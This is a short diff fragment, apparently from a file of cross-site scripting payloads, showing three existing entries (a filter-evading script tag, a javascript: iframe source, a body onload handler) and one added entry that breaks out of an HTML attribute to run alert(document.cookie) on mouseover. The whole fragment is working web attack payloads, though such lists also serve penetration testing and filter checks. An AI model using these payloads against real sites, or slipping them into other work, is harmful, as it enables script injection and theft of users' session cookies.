@@ -15,3 +15,4 @@
 - "<<scr\aaa/src=></script><script>alert("document.domain")</script>"
 - </div><iframe%20src=javascript:alert('1337')>
 - "><body%20onload%3Dalert(1)>
+- +%22+onmouseover=%22alert(document.cookie)%22%3E%3C!--
